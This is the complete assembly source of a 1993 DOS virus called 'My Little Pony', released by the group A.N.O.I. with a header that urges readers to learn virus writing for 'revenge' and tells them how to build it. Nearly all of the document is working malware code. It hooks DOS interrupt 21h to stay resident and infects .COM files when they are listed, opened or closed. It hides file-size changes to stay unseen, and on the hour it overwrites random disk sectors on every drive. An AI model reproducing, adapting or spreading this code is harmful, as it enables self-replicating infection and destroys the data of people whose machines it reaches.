		.model tiny
		.code

		org     100h

start:

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;                    A NEW ORDER OF INTELLIGENCE PRESENTS:                     ;
;                             My Little Pony 1.00                              ;
;           Copyright (c) 1992, 1993 by Cruel Entity / Macaroni Ted            ;
;                                 - A.N.O.I -                                  ;
;                                                                              ;
;                                                                              ;
; I know that there is a much better documented source-code for this           ;
; virus. And I'm also very interessted to get in touch with the guy            ;
; who did that documentation. Please contact me.                               ;
;                                                                              ;
; You may freely use this code as you want, just give me some of the           ;
; credits. Please learn to create virus, so we, together can get our           ;
; revenge to the soceity. Learn to feel the feeling being cruel!               ;
;                                                                              ;
; Of cource I can't take any responsibility for all virus-coders               ;
; who use any of the routines in this virus.                                   ;
;                                                                              ;
;                                                                              ;
; Greetings to;  The Unforgiven for giving me AT&T's                           ;
;                Immortal Riot's members '94                                   ;
;                The man sitting in basement                                   ;
;                                                                              ;
; ps! Tasm /m3 and tlink /t to get this babe into executable!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;

start:
		call    $+3
sub_this:       pop     bp

		mov     ax,0dd22h                ;are we already in memory?
		int     21h
		cmp     ax,03d33h
		jne     $+7
		lea     dx,[bp+(cancel-sub_this)]
		jmp     far ptr dx

		mov     ax,3521h                ;get int 21h vect
		int     21h
		mov     [bp+(int_21h_off-sub_this)],bx
		mov     [bp+(int_21h_seg-sub_this)],es

		mov     ax,cs
		dec     ax
		mov     es,ax
		mov     ax,es:[0003h]
		sub     ax,[bp+(memlen-sub_this)]
		mov     es:[0003h],ax
		mov     ax,[bp+(memlen-sub_this)]
		sub     word ptr es:[0012h],ax
		mov     es,es:[0012h]
		push    es

		lea     si,[bp+(start-sub_this)]
		mov     di,0100h
		mov     cx,[bp+(filelen-sub_this)]
		rep     movsb

		pop     ds                      ;es => ds
		mov     ax,2521h                ;new vector at ES:0100
		lea     dx,new_int_21h
		int     21h
cancel:
		push    cs                      ;cs => ds => es
		push    cs
		pop     ds
		pop     es

		lea     si,[bp+(first_bytes-sub_this)]
		mov     cx,3
		mov     di,100h
		rep     movsb
		sub     di,3
		jmp     far ptr di

		db      'Simple Simon met a pieman going to the fair said'
		db      ' Simple Simon to the pieman let me take your ware'
write_rnd_sector:
		cmp     dh,0            ;sec
		jne     back

		cmp     dl,5            ;100th
		ja      back


		pushf                   ;fuck rnd sector
		push    bx

		call    get_rnd
		mov     cx,10           ;/ 10
		xor     dx,dx
		div     cx
		mov     dx,ax           ;dx=ax

		mov     al,2h           ; Drive #, start with C:
		mov     cx,1h           ; # of sectors to overwrite
		lea     bx,logo         ; Address to overwriting DATA
loopie:
		int     26h
		popf
		inc     al
		cmp     al,25
		jne     loopie


		pop     bx
		popf
		jmp     back

		db      '(c)1993 Cruel Entity'

;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
;                                 New int 21h
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
new_int_21h:
		pushf

		cmp     ax,0dd22h       ;check if resident
		je      mem_check

		cmp     ah,11h          ;find 1st old
		je      find_old
		cmp     ah,12h          ;find 1st old
		je      find_old

		cmp     ah,4eh                  ;dos 2.x
		je      find_
		cmp     ah,4fh
		je      find_

		cmp     ah,3dh          ;open
		je      open_

		cmp     ah,3eh          ;close
		je      close_

		cmp     ah,2ch
		je      back2

		push    ax
		push    cx
		push    dx

		mov     ah,2ch
		int     21h

		cmp     cl,00                   ;a new hour?
		je      write_rnd_sector
back:
		pop     dx
		pop     cx
		pop     ax

back2:
		cmp     ah,36h
		jne     return_21h
		push    bp
		lea     bp,get_free_space
		jmp     far ptr bp
return_21h:
		popf

real_int_21h:   db      0eah            ;jmp...
int_21h_off     dw      ?               ;to old int 21h
int_21h_seg     dw      ?
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


find_:
		push    bp
		lea     bp,find_new
		jmp     far ptr bp

open_:
		push    bp
		lea     bp,open
		jmp     far ptr bp
close_:
		push    bp
		lea     bp,close_file
		jmp     far ptr bp

mem_check:
		popf
		mov     ax,3d33h
		iret
call_int21h:
		jmp     dword ptr cs:int_21h_off   ;force a call to DOS
		ret

find_old:
		popf

		pushf                           ;find fcb
		push    cs
		call    call_int21h
		cmp     al,0ffh
		je      no_more_files

		pushf
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp

		mov     ah,2fh                  ;get dta
		int     21h

		push    es              ;es:bx
		pop     ds              ;ds:bx
		mov     si,bx           ;ds:si

		add     si,16           ;ext name
		lodsw
		cmp     ax,'OC'         ;.CO
		jne     cancel_ff
		lodsb
		cmp     al,'M'          ;M
		jne     cancel_ff
ext_ok:
					 ;ext=com
		mov     si,bx            ;check size
		add     si,26h
		lodsw
		cmp     ax,0            ;=> 0ffffh?
		jne     cancel_ff

		mov     si,bx           ;check if already infected
		add     si,30
		lodsw                   ;time
		and     al,00011111b
		cmp     al,00001010b
		je      $+7            ;already infected (sec=24)
		lea     dx,store_in_mem
		jmp     far ptr dx

		mov     si,bx           ;alter size
		add     si,36
		mov     di,si
		lodsw
		sub     ax,cs:filelen
		jz      cancel_ff
		stosw
cancel_ff:
		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
no_more_files:  retf    2               ;iret flags

	   db      "%%% MY LITTLE PONY %%% COPYRIGHT(C) 1993 A.N.O.I. %%%"

store_in_mem:                           ;store filename in buffer
		mov     si,bx
		add     si,8

		push    cs              ;cs => es
		pop     es

		mov     cx,10
		lea     di,file_buffer  ;check pos
check_pos:
		cmp     byte ptr es:[di],20h
		je      store
		add     di,8
		loop    check_pos
		jmp     cancel_ff

store:
		mov     cx,8
		rep     movsb
		jmp     cancel_ff
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

get_free_space:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp

		push    cs              ;cs=> ds=> es
		push    cs
		pop     ds
		pop     es

		lea     di,file_buffer
		mov     cx,10
check_last:
		cmp     byte ptr [di],20h       ;check if last
		je      cancel_inf

		push    di
		push    cx
		mov     si,di           ;si=file pos
		call    infect
		pop     cx
		pop     di

		add     di,8
		loop    check_last
cancel_inf:
		push    cs
		pop     es
		lea     di,file_buffer
		mov     cx,80+12
		mov     al,20h
		rep     stosb

		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
		jmp     real_int_21h

infect:
					;convert filename to asciiz
		lea     di,filename
		mov     cx,8            ;filename NOT ext
cpy_filename:
		lodsb
		cmp     al,20h
		je      filename_klar
		stosb
		loop    cpy_filename
filename_klar:
		mov     al,'.'
		stosb
		mov     al,'C'
		stosb
		mov     al,'O'
		stosb
		mov     al,'M'
		stosb
		mov     al,0
		stosb

		push    cs
		pop     ds

		mov     ax,4300h        ;get attrib
		lea     dx,filename
		int     21h
		jnc     $+3             ;error?
		ret

		push    cx              ;save attrib

		xor     cx,cx
		mov     ax,4301h        ;force all attribs
		int     21h

		mov     ax,3d02h        ;open filename
		lea     dx,filename
		pushf
		push    cs
		call    call_int21h
		mov     bx,ax           ;save handle

		mov     ax,5700h        ;get time/date
		int     21h

		push    dx              ;save time/date
		push    cx

		and     cl,00011111b
		cmp     cl,00001010b
		jne     $+7            ;already infected (sec=24)
		lea     dx,cancel_inf2
		jmp     far ptr dx



		mov     ah,3fh                  ;read 3 first bytes
		mov     cx,3
		lea     dx,first_bytes
		int     21h

		mov     ax,4202h                ;goto eof
		xor     dx,dx
		xor     cx,cx
		int     21h

		sub     ax,3                    ;create a jmp
		mov     jmp_2,ax

		mov     ah,40h                  ;write virus
		mov     dx,100h
		mov     cx,filelen
		int     21h

		mov     ax,4200h                ;goto beg
		xor     dx,dx
		xor     cx,cx
		int     21h

		mov     ah,40h                  ;write jmp
		mov     cx,3
		lea     dx,jmp_1
		int     21h
cancel_inf2:
		pop     cx                      ;restore time/date
		pop     dx

		and     cl,11100000b            ;secs=20
		or      cl,00001010b
		mov     ax,5701h                ;set time/date
		int     21h

		mov     ah,3eh                  ;close
		pushf
		push    cs
		call    call_int21h

		mov     ax,4301h                ;set attrib
		lea     dx,filename
		pop     cx                      ;restore attrib
		int     21h

		ret
find_new:
		pop     bp
		popf

		pushf                           ;find 4e
		push    cs
		call    call_int21h
		jnc     more_files
		retf    2
more_files:
		pushf
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp

		mov     ah,2fh                  ;get dta
		int     21h

		push    es              ;es:bx
		pop     ds              ;ds:bx

		mov     si,bx           ;ds:si

		push    cs              ;cs => es
		pop     es

		add     si,1eh          ;f name
		lea     di,filename
		mov     cx,25

get_fname:
		lodsb
		cmp     al,0
		je      get_f_klar
		stosb
		loop    get_fname
get_f_klar:
		mov     al,0            ;asciiz
		stosb

		push    ds              ;ds=> es
		pop     es
		push    cs              ;cs=> ds
		pop     ds
		mov     si,di

		sub     si,4            ;'COM'
		lodsw                   ;CO

		cmp     ax,'OC'
		je      check_m
		cmp     ax,'oc'
		jne     cancel_new
check_m:
		lodsb
		cmp     al,'m'
		je      ext_is_com
		cmp     al,'M'
		jne     cancel_new

ext_is_com:
		push    es              ;es=> ds
		pop     ds

		mov     si,bx
		add     si,1ch          ;check size
		lodsw
		cmp     ax,0            ;=> 0ffffh
		jne     cancel_new

		mov     si,bx
		add     si,16h
		lodsw                   ;time
		and     al,00011111b
		cmp     al,00001010b
		jne     cancel_new     ;not infected

		mov     si,bx
		add     si,1ah
		mov     di,si
		lodsw                   ;alter size
		sub     ax,cs:filelen
		jz      cancel_new
		stosw

cancel_new:
		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
no_more_files2: retf    2               ;iret flags
open:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    bp
		push    ds
		push    es


		mov     al,'.'
		push    ds              ;ds=> es
		pop     es
		mov     di,dx           ;es:di filename

		mov     cx,50
		repnz   scasb

		mov     si,di           ;ds:si file ext.

		lodsw
		cmp     ax,'OC'
		je      check_m2
		cmp     ax,'oc'
		je      $+7
		lea     dx,cancel_open
		jmp     far ptr dx
check_m2:
		lodsb
		cmp     al,'m'
		je      ext_is_com2
		cmp     al,'M'
		jne     cancel_open

ext_is_com2:
		mov     ax,3d02h        ;open file
		pushf
		push    cs
		call    call_int21h
		jc      cancel_open
		mov     bx,ax

		push    cs
		pop     ds
		push    cs
		pop     es

		mov     ax,5700h        ;get time/date
		int     21h

		and     cl,00011111b    ;already infected
		cmp     cl,00001010b
		jne     cancel_open

		mov     ax,4202h        ;goto eof
		xor     dx,dx
		xor     cx,cx
		int     21h

		push    ax              ;save size
		sub     ax,3

		mov     dx,ax           ;goto eof -3
		mov     ax,4200h
		mov     cx,0
		int     21h

		mov     ah,3fh          ;read
		mov     cx,3
		lea     dx,temp_bytes
		int     21h


		mov     ax,4200h        ;goto beg
		xor     cx,cx
		xor     dx,dx
		int     21h

		mov     ah,40h          ;write original
		mov     cx,3
		lea     dx,temp_bytes
		int     21h

		pop     dx
		sub     dx,filelen

		mov     ax,4200h        ;goto real size
		mov     cx,0
		int     21h

		mov     ah,40h
		mov     cx,0
		int     21h

		mov     ah,3eh
		pushf
		push    cs
		call    call_int21h
cancel_open:
		pop     es
		pop     ds
		pop     bp
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf

		pushf                           ;open file...
		push    cs
		call    call_int21h
		retf    2

close_file:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    bp
		push    ds
		push    es

		mov     ax,1220h        ;get handle table
		int     02Fh
		mov     bl,es:[di]
		mov     ax,1216h
		int     02Fh

		mov     bp,di

		add     di,28h
		push    es
		pop     ds
		mov     si,di
		lodsw
		cmp     ax,'OC'
		jne     cancel_open
		lodsb
		cmp     al,'M'
		jne     cancel_open

		mov     si,bp
		add     si,20h
		push    cs
		pop     es

		call    infect

		jmp     cancel_open

get_rnd:
		push   dx
		push   cx
		push   bx
		in     al,40h                         ;'@'
		add    ax,0000
		mov    dx,0000
		mov    cx,0007
rnd_init5:
		shl    ax,1
		rcl    dx,1
		mov    bl,al
		xor    bl,dh
		jns    rnd_init6
		inc    al
rnd_init6:
		loop   rnd_init5
		pop    bx
		mov    al,dl
		pop    cx
		pop    dx
rnd_init_ret:
		ret

logo            db      '>>>  A.N.O.I  <<<' ; DATA to overwrite with


temp_bytes      db      3 dup(?)
filelen         dw      offset eof - offset start
memlen          dw      100
file_buffer     db      80 dup(20h)
filename        db      12 dup(?)

jmp_1           db      0e9h
jmp_2           dw      ?
first_bytes     db      90h,0cdh,20h

eof:
		end     start
